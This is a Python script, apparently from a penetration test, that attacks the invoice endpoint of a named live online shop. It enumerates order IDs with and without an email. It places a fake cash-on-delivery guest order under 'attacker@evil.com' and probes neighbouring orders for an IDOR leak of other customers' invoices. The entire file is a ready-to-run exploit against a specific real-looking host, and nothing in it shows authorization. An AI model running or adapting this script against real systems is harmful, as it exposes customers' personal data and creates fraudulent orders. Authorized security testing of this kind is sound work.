#!/usr/bin/env python3
"""
Security test script for AUTHZ-VULN-01
Tests guest invoice download without proper authorization on https://shophubonline.store
"""

import requests
import json
import time

BASE_URL = "https://shophubonline.store"
RESULTS = []

def log(msg):
    print(msg)
    RESULTS.append(msg)

def req(method, url, **kwargs):
    try:
        r = requests.request(method, url, timeout=15, **kwargs)
        return r
    except Exception as e:
        log(f"  [ERROR] {e}")
        return None

def print_response(r, label=""):
    if r is None:
        log(f"  {label} -> NO RESPONSE")
        return
    body = r.text[:500] if r.text else "(empty)"
    log(f"  {label} -> HTTP {r.status_code} | Body: {body}")

# ─────────────────────────────────────────────
# Step 0: Discover valid product IDs
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 0: Fetching product list to find valid productIds")
log("=" * 70)
r = req("GET", f"{BASE_URL}/api/products")
print_response(r, "GET /api/products")

valid_product_id = 1  # fallback
if r and r.status_code == 200:
    try:
        data = r.json()
        products = data if isinstance(data, list) else data.get("products", data.get("data", []))
        if products and len(products) > 0:
            valid_product_id = products[0].get("id", products[0].get("_id", 1))
            log(f"  Found product ID: {valid_product_id}")
    except Exception as e:
        log(f"  Could not parse products: {e}")

log("")

# ─────────────────────────────────────────────
# Step 1: Probe orders 1-30 WITHOUT email
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 1: Probing /api/orders/X/invoice (no email) for IDs 1-30")
log("=" * 70)

no_email_results = {}
for order_id in range(1, 31):
    url = f"{BASE_URL}/api/orders/{order_id}/invoice"
    r = req("GET", url)
    if r:
        body_snippet = r.text[:200]
        no_email_results[order_id] = {"status": r.status_code, "body": body_snippet}
        log(f"  Order {order_id:>3}: HTTP {r.status_code} | {body_snippet[:150]}")
    else:
        no_email_results[order_id] = {"status": "ERR", "body": ""}

log("")

# ─────────────────────────────────────────────
# Step 2: Probe orders 1-30 WITH test email
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 2: Probing /api/orders/X/invoice?email=test@test.com for IDs 1-30")
log("=" * 70)

test_email_results = {}
for order_id in range(1, 31):
    url = f"{BASE_URL}/api/orders/{order_id}/invoice"
    r = req("GET", url, params={"email": "test@test.com"})
    if r:
        body_snippet = r.text[:200]
        test_email_results[order_id] = {"status": r.status_code, "body": body_snippet}
        log(f"  Order {order_id:>3}: HTTP {r.status_code} | {body_snippet[:150]}")
    else:
        test_email_results[order_id] = {"status": "ERR", "body": ""}

log("")

# ─────────────────────────────────────────────
# Step 3: Create a guest order and then do IDOR
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 3: Creating a guest order")
log("=" * 70)

attacker_email = "attacker@evil.com"
guest_payload = {
    "guestEmail": attacker_email,
    "guestName": "Test User",
    "guestPhone": "1234567890",
    "shippingAddress": {
        "street": "123 Test St",
        "city": "Test City",
        "state": "TS",
        "zipCode": "12345",
        "country": "India"
    },
    "paymentMethod": "cod",
    "items": [{"productId": valid_product_id, "quantity": 1}]
}

r = req("POST", f"{BASE_URL}/api/orders/guest",
        headers={"Content-Type": "application/json"},
        json=guest_payload)
print_response(r, "POST /api/orders/guest")

my_order_id = None
if r and r.status_code in (200, 201):
    try:
        data = r.json()
        # Try common key names
        for key in ("orderId", "order_id", "id", "_id"):
            if key in data:
                my_order_id = data[key]
                break
        if my_order_id is None and "order" in data:
            order_obj = data["order"]
            for key in ("orderId", "order_id", "id", "_id"):
                if key in order_obj:
                    my_order_id = order_obj[key]
                    break
        log(f"  My order ID: {my_order_id}")
        log(f"  Full response (first 500): {str(data)[:500]}")
    except Exception as e:
        log(f"  Could not parse order response: {e}")
else:
    log(f"  Guest order creation failed or returned unexpected status.")

log("")

# ─────────────────────────────────────────────
# Step 3b: Access OWN invoice to confirm auth works
# ─────────────────────────────────────────────
if my_order_id:
    log("=" * 70)
    log(f"STEP 3b: Accessing OWN invoice (order {my_order_id}) with correct email")
    log("=" * 70)
    url = f"{BASE_URL}/api/orders/{my_order_id}/invoice"
    r = req("GET", url, params={"email": attacker_email})
    print_response(r, f"GET /invoice/{my_order_id}?email={attacker_email}")
    log("")

# ─────────────────────────────────────────────
# Step 4: IDOR – enumerate neighbouring orders with OWN email
# ─────────────────────────────────────────────
if my_order_id:
    log("=" * 70)
    log(f"STEP 4: IDOR test – probing orders near {my_order_id} with attacker email")
    log("=" * 70)

    try:
        base = int(my_order_id)
    except (TypeError, ValueError):
        base = None

    if base:
        idor_range = list(range(max(1, base - 5), base)) + list(range(base + 1, base + 6))
        for oid in idor_range:
            url = f"{BASE_URL}/api/orders/{oid}/invoice"
            r = req("GET", url, params={"email": attacker_email})
            if r:
                body_snippet = r.text[:300]
                flag = "*** POSSIBLE IDOR LEAK ***" if r.status_code == 200 else ""
                log(f"  Order {oid}: HTTP {r.status_code} {flag} | {body_snippet[:200]}")
            else:
                log(f"  Order {oid}: NO RESPONSE")
    else:
        log(f"  Could not convert order ID '{my_order_id}' to integer for range test.")
    log("")

# ─────────────────────────────────────────────
# Step 5: Summary
# ─────────────────────────────────────────────
log("=" * 70)
log("STEP 5: SUMMARY")
log("=" * 70)

# Categorise no-email results
status_groups = {}
for oid, info in no_email_results.items():
    s = info["status"]
    status_groups.setdefault(s, []).append(oid)
log("No-email probe status distribution:")
for s, ids in sorted(status_groups.items(), key=lambda x: str(x[0])):
    log(f"  HTTP {s}: orders {ids}")

status_groups2 = {}
for oid, info in test_email_results.items():
    s = info["status"]
    status_groups2.setdefault(s, []).append(oid)
log("test@test.com probe status distribution:")
for s, ids in sorted(status_groups2.items(), key=lambda x: str(x[0])):
    log(f"  HTTP {s}: orders {ids}")

if my_order_id:
    log(f"\nOwn guest order created: ID={my_order_id}, email={attacker_email}")
else:
    log("\nCould not create a guest order – check payload / products availability.")

log("\nDone.")
